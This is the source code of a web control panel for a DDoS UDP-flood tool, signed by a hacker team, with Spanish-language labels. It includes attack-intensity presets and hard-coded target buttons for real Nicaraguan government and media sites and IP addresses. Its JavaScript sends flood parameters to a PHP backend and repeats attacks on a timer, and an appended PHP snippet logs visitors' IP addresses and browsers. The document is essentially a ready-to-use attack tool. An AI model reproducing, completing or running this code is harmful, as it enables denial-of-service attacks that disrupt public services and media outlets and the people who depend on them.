<!DOCTYPE html>
<html lang="en">
<head>
    <title>DDoS UDP Flood | By Team Unc3ns0r3d</title>
    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="author" content="Team Unc3ns0r3d" />
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
    <script>
        function microAjax(B,A){this.bindFunction=function(E,D){return function(){return E.apply(D,[D])}};this.stateChange=function(D){if(this.request.readyState==4){this.callbackFunction(        // microAjax - https://github.com/TheZ3ro/microajax/
this.request.responseText)}};this.getRequest=function(){if(window.ActiveXObject){return new ActiveXObject("Microsoft.XMLHTTP")}else{if(window.XMLHttpRequest){return new XMLHttpRequest()}}return false};this.postBody=(arguments[2]||"");this.callbackFunction=A;this.url=B;this.request=this.getRequest();if(this.request){var C=this.request;C.onreadystatechange=this.bindFunction(this.stateChange,this);if(this.postBody!==""){C.open("POST",B,true);C.setRequestHeader("X-Requested-With","XMLHttpRequest");C.setRequestHeader("Content-type","application/x-www-form-urlencoded");C.setRequestHeader("Connection","close")}else{C.open("GET",B,true)}C.send(this.postBody)}};
    </script>
</head>
<body>
    <div class="shadow p-3 mb-5 bg-white rounded">
  <div class="container">
    <h1 class="display-6 text-info">#TEAM UNC3NS0R3D | Creado por Sk4rYS3c</h1>
  </div>
</div>
    <div id="ddos" class="container">
         <hr>
        CONFIGURACIONES:<br />
        
        <button id="loadLag" class="btn btn-outline-info btn-sm" onClick="javascript:lagConfig();">Ataque Normal</button>
        <button id="loadTraffic" class="btn btn-outline-warning btn-sm" onClick="javascript:trafficConfig();">Ataque Medio</button>
        <button id="loadTraffic" class="btn btn-outline-danger btn-sm" onClick="javascript:freneticConfig();">Ataque Frenetico (Test)</button>
        <hr>
        LISTA DE TARGETS:<br />
        <button id="loadLag" class="btn btn-outline-secondary btn-sm" onClick="javascript:Target1F();">Target 19DIGITAL</button>
        <button id="loadLag" class="btn btn-outline-secondary btn-sm" onClick="javascript:Target2F();">Target LAGACETA.GOB.NI</button>
        <button id="loadLag" class="btn btn-outline-secondary btn-sm" onClick="javascript:Target3F();">Target INSS.GOB.NI</button>
        <button id="loadLag" class="btn btn-outline-secondary btn-sm" onClick="javascript:Target4F();">Target CANAL6.COM.NI</button>
        <button id="loadLag" class="btn btn-outline-secondary btn-sm" onClick="javascript:Target5F();">Target TN8.TV</button>
        <hr>
        <br />
        <div class="input-group mb-3">
        <div class="input-group-prepend">
            <span class="input-group-text" id="basic-addon1">Host:</span>
          </div>
          <input type="text" id="host" class="form-control" placeholder="Host" aria-label="Host" aria-describedby="basic-addon1">
        </div>

        <div class="input-group mb-3">
        <div class="input-group-prepend">
            <span class="input-group-text" id="basic-addon1">Puerto:</span>
        </div>
          <input type="number" id="port" max=65535 min=1 step=1 value=80 class="form-control" placeholder="80" aria-label="80" aria-describedby="basic-addon1">
        </div>

        <div class="input-group mb-3">
        <div class="input-group-prepend">
            <span class="input-group-text" id="basic-addon1">Paquetes:</span>
        </div>
          <input type="number" id="packet" min=1 step=1 class="form-control" placeholder="0" aria-label="0" aria-describedby="basic-addon1">
        </div>

        <div class="input-group mb-3">
        <div class="input-group-prepend">
            <span class="input-group-text" id="basic-addon1">Tiempo:</span>
        </div>
          <input type="number" id="time" min=1 step=1 value=5 class="form-control" placeholder="60" aria-label="60" aria-describedby="basic-addon1">
        </div>

        <div class="input-group mb-3">
        <div class="input-group-prepend">
            <span class="input-group-text" id="basic-addon1">Bytes:</span>
        </div>
          <input type="number" id="bytes" max=65000 min=1 step=1 value=65000 class="form-control" placeholder="65000" aria-label="65000" aria-describedby="basic-addon1">
        </div>

        <div class="input-group mb-3">
        <div class="input-group-prepend">
            <span class="input-group-text" id="basic-addon1">Intervalo:</span>
        </div>
          <input type="number" id="interval" max=10000 min=1 step=1 value=10 class="form-control" placeholder="10" aria-label="10" aria-describedby="basic-addon1">
        </div>

         <div class="input-group mb-3">
        <div class="input-group-prepend">
            <span class="input-group-text" id="basic-addon1">Contraseña:</span>
        </div>
          <input type="password" id="pass" class="form-control" aria-describedby="basic-addon1">
        </div>
         <div class="alert alert-info alert-dismissible fade show">
        <button type="button" class="close" data-dismiss="alert">&times;</button>
        <strong>INF!</strong> Descifrar contraseña en MD5: d05cfc46d7a155982acfcb307bac002b
      </div>
        <hr>
        <button id="send" class="btn btn-danger" onClick="javascript:fire();">Atacar!</button>
        <br/><br/>
        <label>Ataque constante con pequeños retrasos</label><br />
        <button id="sendWithInterval" class="btn btn-dark" onClick="javascript:constantAttack(true);">Inciar</button>
        <button id="stopInterval" disabled="true" class="btn btn-dark" onClick="javascript:constantAttack(false);">Parar</button>
        <br/><br/>
        <textarea id="log" rows="10" cols="50"></textarea>
    </div>
    <script>
        var _log=document.getElementById("log");
        var intervalHandler = null;
        function fire(){
            var host=document.getElementById("host").value;
            var port=document.getElementById("port").value;
            var packet=document.getElementById("packet").value;
            var time=document.getElementById("time").value;
            var pass=document.getElementById("pass").value;
            var bytes=document.getElementById("bytes").value;
            var interval=document.getElementById("interval").value;
            
            
            if(host!="" && pass!=""){
                inputLock(true);
                var url='./backend.php?pass='+pass+'&host='+host+(port!=""? '&port='+port:'')+(time!=""? '&time='+time:'')+(packet!=""? '&packet='+packet:'')+(bytes!=""? '&bytes='+bytes:'')+(interval!=""? '&interval='+interval:'');
                console.log(url);
                microAjax(url, function(result) { 
                _log.value=result;
                if(_log.value.includes("Error al ingresar la contraseña")){
                    constantAttack(false);
                }
                if(intervalHandler == null){
                    inputLock(false);
                }
                });
            }
            else{
                _log.value = "¡No todos los parámetros requeridos se rellenaron correctamente!"
            }
        }
        
        function lagConfig(){
            packet=document.getElementById("packet").value = "";
            time=document.getElementById("time").value = "10";
            bytes=document.getElementById("bytes").value = "1";
            interval=document.getElementById("interval").value = "0";
        }
        
        function trafficConfig(){
            packet=document.getElementById("packet").value = "";
            time=document.getElementById("time").value = "5";
            bytes=document.getElementById("bytes").value = "65000";
            interval=document.getElementById("interval").value = "10";
        }

        function freneticConfig(){
            packet=document.getElementById("packet").value = "";
            time=document.getElementById("time").value = "60";
            bytes=document.getElementById("bytes").value = "65000";
            interval=document.getElementById("interval").value = "1";
        }

        //TARGETS LIST BY SKARYSEC

        function Target1F(){
            host=document.getElementById("host").value = "165.98.68.46";
            port=document.getElementById("port").value = "80";
 
        }

        function Target2F(){
            host=document.getElementById("host").value = "35.227.113.175";
            port=document.getElementById("port").value = "80";
 
        }

        function Target3F(){
            host=document.getElementById("host").value = "www.inss.gob.ni";
            port=document.getElementById("port").value = "80";
 
        }

        function Target4F(){
            host=document.getElementById("host").value = "canal6.com.ni";
            port=document.getElementById("port").value = "80";
 
        }

        function Target5F(){
            host=document.getElementById("host").value = "67.205.163.220";
            port=document.getElementById("port").value = "80";
 
        }
        
        function constantAttack(status){
            var host=document.getElementById("host").value;
            var host=document.getElementById("pass").value;
            var intervalTime=(document.getElementById("time").value * 1000) + 1000;
            if(host!="" && pass!=""){
                if(status == true){
                    fire();
                    inputLock(true);
                    intervalHandler = setInterval(fire,intervalTime);
                }
                else if(status == false){
                    clearInterval(intervalHandler);
                    inputLock(false);
                    intervalHandler = null;
                }
            }
            else{
                _log.value = "¡No todos los parámetros requeridos se rellenaron correctamente!"
            }
        }
        
        function inputLock(status){
            var inputs = document.getElementsByTagName("input");
            var buttons = document.getElementsByTagName("button");
            if(status == true){
                for(i = 0;i < inputs.length;i++)
                {
                    inputs[i].disabled = true;
                }
                for(i = 0;i < buttons.length;i++)
                {
                    buttons[i].disabled = true;
                }
                document.getElementById("stopInterval").disabled = false;
            }
            else{
                for(i = 0;i < inputs.length;i++)
                {
                    inputs[i].disabled = false;
                }
                for(i = 0;i < buttons.length;i++)
                {
                    buttons[i].disabled = false;
                }
                document.getElementById("stopInterval").disabled = true;
            }
        }
    </script>
    <div class="shadow p-3 mb-5 bg-white rounded" style="margin-bottom:0">
    
</div>
<p align="right">DDOS Creado por Sk4rYS3c.</p>
</body>
</html>

<?php
$ip = getUserIP();
$browser = $_SERVER['HTTP_USER_AGENT'];
$dateTime = date('Y/m/d G:i:s');
$file = "visitors.html";
$file = fopen($file, "a");
$data = "<pre><b>User IP</b>: $ip <b> Navegador</b>: $browser <br> Dato : $dateTime <br></pre>";
fwrite($file, $data);
fclose($file);
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
?>

